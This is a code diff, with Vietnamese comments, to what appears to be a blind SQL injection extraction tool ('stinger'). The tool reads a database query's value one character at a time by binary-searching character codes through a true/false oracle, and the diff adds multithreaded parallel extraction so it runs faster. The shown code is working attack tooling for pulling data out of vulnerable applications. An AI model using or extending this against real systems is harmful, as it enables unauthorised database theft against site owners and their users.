@@ -16,6 +16,7 @@ Chế độ:
 
 from __future__ import annotations
 
+from concurrent.futures import ThreadPoolExecutor
 from typing import Optional
 
 from stinger.oracle import Oracle
@@ -83,17 +84,64 @@ def get_number(oracle: Oracle, expr: str, hi: int = 4096) -> int:
     return bsearch(oracle, expr, 0, hi)
 
 
+# ------------------------------------------------------------- đọc từng đơn vị (1 vị trí)
+def _read_hex_digit(oracle: Oracle, dia: "Dialect", src: str, i: int) -> str:
+    """Đọc 1 hex-digit ở vị trí i (ký tự '0'-'9' hoặc 'A'-'F'). Độc lập -> song song được."""
+    expr = dia.char_code_at(src, i)
+    # '0'-'9'=48-57, 'A'-'F'=65-70
+    if oracle.ask("%s between 48 and 57" % expr):
+        code = bsearch(oracle, expr, 48, 57)
+    else:
+        code = bsearch(oracle, expr, 65, 70)
+    return chr(code)
+
+
+def _read_char(oracle: Oracle, dia: "Dialect", query: str, i: int) -> int:
+    """Đọc mã 1 ký tự ở vị trí i (0..255). Trả về code (0 = ký tự NUL/hết chuỗi)."""
+    expr = dia.char_code_at(query, i)
+    return bsearch(oracle, expr, 0, 255)
+
+
+def _run_positions(n: int, worker, threads: int, on_done):
+    """Chạy `worker(i)` cho i=1..n. Nếu threads>1 -> song song qua ThreadPoolExecutor.
+
+    - worker(i) trả về kết quả cho vị trí i (thứ tự 1-based).
+    - on_done(done_count) gọi mỗi khi một vị trí xong (để cập nhật tiến độ).
+    - Trả về list kết quả theo ĐÚNG thứ tự vị trí (1..n), bất kể thứ tự hoàn thành.
+    """
+    results: list = [None] * n
+    if threads <= 1:
+        for idx in range(n):
+            results[idx] = worker(idx + 1)
+            on_done(idx + 1)
+        return results
+
+    # Song song: mỗi vị trí là 1 task độc lập. Gom kết quả theo index để giữ thứ tự.
+    done = 0
+    with ThreadPoolExecutor(max_workers=threads) as pool:
+        future_to_idx = {pool.submit(worker, idx + 1): idx for idx in range(n)}
+        from concurrent.futures import as_completed
+        for fut in as_completed(future_to_idx):
+            idx = future_to_idx[fut]
+            results[idx] = fut.result()  # ném lại exception nếu worker lỗi
+            done += 1
+            on_done(done)
+    return results
+
+
 # --------------------------------------------------------------------------- extract
 def extract(oracle: Oracle,
             query: str,
             dialect: dict,
             mode: str = "hex",
             maxlen: Optional[int] = None,
+            threads: int = 1,
             progress=None,
             log=None) -> tuple[bytes, dict]:
     """Trích xuất giá trị của <query>. Trả về (raw_bytes, meta).
 
-    progress(done, total, preview) - callback tùy chọn để hiện tiến độ.
+    threads                         - số vị trí ký tự đọc song song (1 = tuần tự).
+    progress(done, total, preview)  - callback tùy chọn để hiện tiến độ.
     log(msg)                        - callback tùy chọn in các bước chính.
     """
     dia = Dialect(dialect)
@@ -124,39 +172,43 @@ def extract(oracle: Oracle,
     _log("[extract]   length()      = %d byte" % blen)
     _log("[extract]   char_length() = %d ký tự%s" % (clen, multibyte))
 
+    thread_note = ("%d luồng song song" % threads) if threads > 1 else "tuần tự (1 luồng)"
+
     if mode == "hex":
         _log("[extract] bước 3: đọc hex(value) - %d hex-digit, mỗi digit ~5 request "
-             "(binary search trên [0-9A-F])..." % (blen * 2))
+             "[%s]..." % (blen * 2, thread_note))
         src = dia.hex(query)
         n = blen * 2
         if maxlen:
             n = min(n, maxlen * 2)
-        digits = ""
-        for i in range(1, n + 1):
-            expr = dia.char_code_at(src, i)
-            # '0'-'9'=48-57, 'A'-'F'=65-70
-            if oracle.ask("%s between 48 and 57" % expr):
-                code = bsearch(oracle, expr, 48, 57)
-            else:
-                code = bsearch(oracle, expr, 65, 70)
-            digits += chr(code)
-            if i % 2 == 0:
-                preview = bytes.fromhex(digits).decode("utf-8", "replace")
-                _progress(i // 2, blen, preview)
+
+        def _on_done(done):
+            # tiến độ tính theo byte (2 hex-digit / byte) - xấp xỉ khi song song
+            _progress(min(done // 2 + (done % 2), blen), blen, "")
+
+        digits_list = _run_positions(
+            n, lambda i: _read_hex_digit(oracle, dia, src, i), threads, _on_done)
+        digits = "".join(digits_list)
+        # preview cuối (khi song song không có preview lũy tiến theo thứ tự)
+        _progress(blen, blen, bytes.fromhex(digits).decode("utf-8", "replace"))
         return bytes.fromhex(digits), meta
 
     if mode == "char":
         _log("[extract] bước 3: đọc trực tiếp từng ký tự - %s ký tự, mỗi ký tự ~8 request "
-             "(binary search trên [0-255])..." % (maxlen or clen))
+             "[%s]..." % (maxlen or clen, thread_note))
         n = maxlen or clen
+
+        def _on_done_c(done):
+            _progress(done, n, "")
+
+        codes = _run_positions(
+            n, lambda i: _read_char(oracle, dia, query, i), threads, _on_done_c)
         out = bytearray()
-        for i in range(1, n + 1):
-            expr = dia.char_code_at(query, i)
-            code = bsearch(oracle, expr, 0, 255)
+        for code in codes:
             if code == 0:
-                break
+                break  # NUL -> hết chuỗi (dừng ở ký tự 0 đầu tiên)
             out.append(code)
-            _progress(i, n, out.decode("utf-8", "replace"))
+        _progress(len(out), n, out.decode("utf-8", "replace"))
         return bytes(out), meta
 
     raise ExtractError("mode không hỗ trợ: %s (dùng 'hex' hoặc 'char')" % mode)
